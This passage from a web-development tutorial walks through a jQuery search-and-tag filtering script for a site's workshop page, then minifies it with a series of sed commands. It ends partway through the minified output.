        <span class="nx">$entries</span><span class="p">.</span><span class="nx">fadeOut</span><span class="p">(</span><span class="mf">150</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header ul li&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>
            <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header h1 a span&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTitle&#39;</span><span class="p">);</span>  <span class="c1">// The span remains but it is destroyed when filtering using the text() function</span>
            <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.workshopentry&quot;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">show</span><span class="p">();</span>
        <span class="p">});</span>
        <span class="nx">$entries</span><span class="p">.</span><span class="nx">fadeIn</span><span class="p">(</span><span class="mf">150</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">searchTerm</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">searchTerm</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// Only history api should push undefined to this, explicitly taken care of otherwise</span>
            <span class="nx">reset</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">rePattern</span> <span class="o">=</span> <span class="nx">searchTerm</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[.?*+^$\[\]\\(){}|]/g</span><span class="p">,</span> <span class="s2">&quot;\\$&amp;&quot;</span><span class="p">),</span> <span class="nx">searchPattern</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="nx">rePattern</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;ig&#39;</span><span class="p">);</span>  <span class="c1">// The brackets add a capture group</span>

            <span class="nx">$entries</span><span class="p">.</span><span class="nx">fadeOut</span><span class="p">(</span><span class="mf">150</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="nx">$noResults</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span>

                <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">parent</span><span class="p">().</span><span class="nx">hide</span><span class="p">();</span>

                    <span class="c1">// Clear results of previous search</span>
                    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>

                    <span class="c1">// Check the title</span>
                    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">textToCheck</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">();</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">textToCheck</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">searchPattern</span><span class="p">))</span> <span class="p">{</span>
                            <span class="nx">textToCheck</span> <span class="o">=</span> <span class="nx">textToCheck</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">searchPattern</span><span class="p">,</span> <span class="s1">&#39;&lt;span class=&quot;searchMatchTitle&quot;&gt;$1&lt;/span&gt;&#39;</span><span class="p">);</span>  <span class="c1">//capture group ($1) used so that the replacement matches the case and you don&#39;t get weird capitolisations</span>
                            <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">textToCheck</span><span class="p">);</span>
                            <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">).</span><span class="nx">show</span><span class="p">();</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                            <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">textToCheck</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">});</span>

                    <span class="c1">// Check the tags</span>
                    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">().</span><span class="nx">match</span><span class="p">(</span><span class="nx">searchPattern</span><span class="p">))</span> <span class="p">{</span>
                            <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>
                            <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">).</span><span class="nx">show</span><span class="p">();</span>
                        <span class="p">}</span>
                    <span class="p">});</span>
                <span class="p">});</span>

                <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.workshopentry[style*=&quot;block&quot;]&#39;</span><span class="p">).</span><span class="nx">length</span> <span class="o">===</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">$noResults</span><span class="p">.</span><span class="nx">show</span><span class="p">();</span>
                <span class="p">}</span>

                <span class="nx">$entries</span><span class="p">.</span><span class="nx">fadeIn</span><span class="p">(</span><span class="mf">150</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header ul li a&#39;</span><span class="p">,</span> <span class="nx">$entries</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nx">hist</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">()},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">(),</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">());</span>
        <span class="nx">$searchBox</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="nx">filter</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">());</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>  <span class="c1">// Using the history API so no page reloads/changes</span>
    <span class="p">});</span>

    <span class="nx">$searchBox</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;keyup&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">searchTimeout</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">().</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">searchTimeout</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">searchVal</span> <span class="o">=</span> <span class="nx">$searchBox</span><span class="p">.</span><span class="nx">val</span><span class="p">();</span>
                <span class="nx">hist</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="nx">searchVal</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="nx">searchVal</span><span class="p">,</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="nx">searchVal</span><span class="p">);</span>
                <span class="nx">filter</span><span class="p">(</span><span class="nx">searchVal</span><span class="p">);</span>
            <span class="p">},</span> <span class="mf">500</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">().</span><span class="nx">length</span> <span class="o">===</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">searchTimeout</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="nx">reset</span><span class="p">();</span>
            <span class="p">},</span> <span class="mf">500</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>

    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#reset&#39;</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nx">$searchBox</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="nx">reset</span><span class="p">();</span>
    <span class="p">});</span>

    <span class="nx">win</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;popstate&quot;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">hist</span><span class="p">.</span><span class="nx">state</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span> <span class="o">===</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Start of history chain on this page, direct entry to page handled by firstRun)</span>
            <span class="nx">reset</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">tag</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">$searchBox</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">tag</span><span class="p">);</span>
                <span class="nx">filter</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">tag</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">});</span>

    <span class="nx">$noResults</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">firstRun</span><span class="p">)</span> <span class="p">{</span>                               <span class="c1">// 0     1     2        3      4 (if / present)</span>
        <span class="kd">var</span> <span class="nx">locArray</span> <span class="o">=</span> <span class="nx">loc</span><span class="p">.</span><span class="nx">pathname</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>   <span class="c1">// &#39;/workshop/tag/searchString/</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tag&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>    <span class="c1">// Check for direct link to tag (i.e. if something in [3] search for it)</span>
            <span class="nx">hist</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">],</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]);</span>
            <span class="nx">filter</span><span class="p">(</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">// Root page and really shouldn&#39;t do anything</span>
            <span class="c1">//hist.pushState({&quot;tag&quot;: undefined}, &quot;theMetaCity - Workshop&quot;, &quot;/workshop/&quot;);</span>
        <span class="p">}</span>   <span class="c1">// locArray[2] === somepagenum is an actual page and what should be allowed to happen by itself</span>

        <span class="nx">firstRun</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="c1">// Save state on first page load</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></div>


<p>Lots of what you see here is unnecessary for the program to execute correctly: comments, white space, new lines etc. Let''s strip them out and see what we get. sed is our friend here again.</p>
<div class="codehilite"><pre><span></span>sed -i <span class="s1">&#39;s/[^:]\/\/.*//g&#39;</span> tmcscripts.js                          <span class="c1"># Dont need comments (and they become greedy when everything is on a single line). [:] is for urls (which have //)</span>
sed -i <span class="s1">&#39;s/ #\*.*$//&#39;</span>g tmcscripts.js                             <span class="c1"># Dont need comments (and they become greedy when everything is on a single line)</span>
sed -i <span class="s1">&#39;/console.*/&#39;</span>d tmcscripts.js                             <span class="c1"># Debug statements</span>
sed -i <span class="s1">&#39;s/^[ \t]*//&#39;</span> tmcscripts.js                              <span class="c1"># Leading whitespace and tabs N.B in theory there shouldnt need to be tabs anywhere but I am sure there will be</span>
sed -i <span class="s1">&#39;s/[ \t]*$//&#39;</span> tmcscripts.js                              <span class="c1"># Trailing whitespace and tabs</span>
sed -i <span class="s1">&#39;s/ () /()/g&#39;</span> tmcscripts.js                              <span class="c1"># Spaces in &#39;function () {&#39;</span>
sed -i <span class="s1">&#39;s/ + /+/g&#39;</span> tmcscripts.js                                <span class="c1"># Spaces in &#39;x + y&#39;</span>
sed -i <span class="s1">&#39;s/ || /||/g&#39;</span> tmcscripts.js                              <span class="c1"># Spaces in &#39;x || y&#39;</span>
sed -i <span class="s1">&#39;s/for (/for(/g&#39;</span> tmcscripts.js                           <span class="c1"># Spaces in &#39;for (&#39; Usually in a for loop</span>
sed -i <span class="s1">&#39;s/; /;/g&#39;</span> tmcscripts.js                                 <span class="c1"># Spaces in &#39;; &#39; Usually in a for loop</span>
sed -i <span class="s1">&#39;s/ \(&amp;lt;\|&amp;lt;=\|&amp;gt;\|&amp;gt;=\) /\1/g&#39;</span> tmcscripts.js    <span class="c1"># Spaces in &#39;x &amp;lt; y|x &amp;gt; y|x &amp;lt;= y|x &amp;gt;= y&#39; Usually in a for loop</span>
sed -i <span class="s1">&#39;s/ \(+=\|-=\) /\1/g&#39;</span> tmcscripts.js                      <span class="c1"># Spaces in &#39;x += y|x -= y&#39;</span>
sed -i <span class="s1">&#39;s/ \(=\+\) /\1/g&#39;</span> tmcscripts.js                         <span class="c1"># Spaces in &#39;x = y&#39;, &#39;x == y&#39;, &#39;x === y&#39;</span>
sed -i <span class="s1">&#39;s/) {/){/g&#39;</span> tmcscripts.js                               <span class="c1"># End of parameter list and opening curly brace</span>
sed -i <span class="s1">&#39;s/if (/if(/g&#39;</span> tmcscripts.js                             <span class="c1"># End of if and opening round bracket</span>
sed -i <span class="s1">&#39;s/, \(.\)/,\1/g&#39;</span> tmcscripts.js                          <span class="c1"># Comma space anything</span>
sed -i <span class="s1">&#39;:a;N;$!ba;s/\n//g&#39;</span> tmcscripts.js                        <span class="c1"># New lines N.B. Put this at the end otherwise other operation (like get rid of leading white space) get confused</span>
</pre></div>


<p>Which results in this nice guy here:</p>
<div class="codehilite"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="s2">&quot;use strict&quot;</span><span class="p">;</span><span class="kd">var</span> <span class="nx">z</span><span class="p">,</span><span class="nx">y</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">w</span><span class="p">,</span><span class="nx">v</span><span class="p">,</span><span class="nx">u</span><span class="p">,</span><span class="nx">t</span><span class="p">,</span><span class="nx">s</span><span class="p">;</span><span class="nx">z</span><span class="o">=</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#noresults&#39;</span><span class="p">);</span><span class="nx">y</span><span class="o">=</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#searchinput&#39;</span><span class="p">);</span><span class="nx">x</span><span class="o">=</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#workshopBlurbEntries&#39;</span><span class="p">);</span><span class="nx">w</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span><span class="nx">u</span><span class="o">=</span><span class="nx">location</span><span class="p">;</span><span class="nx">t</span><span class="o">=</span><span class="nx">history</span><span class="p">;</span><span class="nx">s</span><span class="o">=</span><span class="nb">window</span><span class="p">;</span><span class="kd">function</span> <span class="nx">k</span><span class="p">(){</span><span class="k">if</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">state</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">){</span><span class="nx">t</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">},</span><span class="s2">&quot;theMetaCity - Workshop&quot;</span><span class="p">,</span><span class="s2">&quot;/workshop/&quot;</span><span class="p">);}</span><span class="nx">z</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span><span class="nx">x</span><span class="p">.</span><span class="nx">fadeOut</span><span class="p">(</span><span class="mf">150</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header ul li&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header h1 a span&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTitle&#39;</span><span class="p">);</span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;.workshopentry&quot;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">show</span><span class="p">();});</span><span class="nx">x</span><span class="p">.</span><span class="nx">fadeIn</span><span class="p">(</span><span class="mf">150</span><span class="p">);}</span><span class="kd">function</span> <span class="nx">l</span><span class="p">(</span><span class="nx">r</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="o">===</span><span class="kc">undefined</span><span class="p">){</span><span class="nx">k</span><span class="p">();}</span> <span class="k">else</span> <span class="p">{</span><span class="kd">var</span> <span class="nx">q</span><span class="o">=</span><span class="nx">r</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[.?*+^$\[\]\\(){}|]/g</span><span class="p">,</span><span class="s2">&quot;\\$&amp;&quot;</span><span class="p">),</span><span class="nx">p</span><span class="o">=</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="o">+</span><span class="nx">q</span><span class="o">+</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39;ig&#39;</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">fadeOut</span><span class="p">(</span><span class="mf">150</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nx">z</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">parent</span><span class="p">().</span><span class="nx">hide</span><span class="p">();</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">o</span><span class="o">=</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">();</span><span class="k">if</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">p</span><span class="p">)){</span><span class="nx">o</span><span class="o">=</span><span class="nx">o</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="s1">&#39;&lt;span class=&quot;searchMatchTitle&quot;&gt;$1&lt;/span&gt;&#39;</span><span class="p">);</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">o</span><span class="p">);</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">).</span><span class="nx">show</span><span class="p">();}</span> <span class="k">else</span> <span class="p">{</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">o</span><span class="p">);}});</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span><span class="k">this</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">().</span><span class="nx">match</span><span class="p">(</span><span class="nx">p</span><span class="p">)){</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">).</span><span class="nx">show</span><span class="p">();}});});</span><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.workshopentry[style*=&quot;block&quot;]&#39;</span><span class="p">).</span><span class="nx">length</span><span class="o">===</span><span class="mf">0</span><span class="p">){</span><span class="nx">z</span><span class="p">.</span><span class="nx">show</span><span class="p">();}</span><span class="nx">x</span><span class="p">.</span><span class="nx">fadeIn</span><span class="p">(</span><span class="mf">150</span><span class="p">);});}}</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;header ul li a&#39;</span><span class="p">,</span><span class="nx">x</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nx">t</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">()},</span><span class="s2">&quot;theMetaCity - Workshop - &quot;</span><span class="o">+</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">(),</span><span class="s2">&quot;/workshop/tag/&quot;</span><span class="o">+</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">());</span><span class="nx">y</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span><span class="nx">l</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">text</span><span class="p">());</span><span class="k">return</span> <span class="kc">false</span><span class="p">;});</span><span class="nx">y</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;keyup&#39;</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">w</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">().</span><span class="nx">length</span><span class="p">){</span><span class="nx">w</span><span class="o">=</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">n</span><span class="o">=</span><span class="nx">y</span><span class="p">.</span><span class="nx">val</span><span class="p">();</span><span class="nx">t</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="nx">n</span><span class="p">},</span><span class="s2">&quot;theMetaCity - Workshop - &quot;</span><span class="o">+</span><span class="nx">n</span><span class="p">,</span><span class="s2">&quot;/workshop/tag/&quot;</span><span class="o">+</span><span class="nx">n</span><span class="p">);</span><span class="nx">l</span><span class="p">(</span><span class="nx">n</span><span class="p">);},</span><span class="mf">500</span><span class="p">);}</span><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">().</span><span class="nx">length</span><span class="o">===</span><span class="mf">0</span><span class="p">){</span><span class="nx">w</span><span class="o">=</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">k</span><span class="p">();},</span><span class="mf">500</span><span class="p">);}});</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#reset&#39;</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nx">y</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span><span class="nx">k</span><span class="p">();});</span><span class="nx">s</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;popstate&quot;</span><span class="p">,</span><span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="o">===</span><span class="kc">null</span><span class="p">){</span><span class="nx">k</span><span class="p">();}</span> <span class="k">else</span> <span class="p">{</span><span class="k">if</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">tag</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">){</span><span class="nx">y</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">tag</span><span class="p">);</span><span class="nx">l</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">tag</span><span class="p">);}}});</span><span class="nx">z</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span><span class="k">if</span><span class="p">(</span><span class="nx">v</span><span class="p">){</span><span class="kd">var</span> <span class="nx">locArray</span><span class="o">=</span><span class="nx">u</span><span class="p">.</span><span class="nx">pathname</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">locArray</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;tag&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">locArray</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span> <span class="o">!==</span> <span 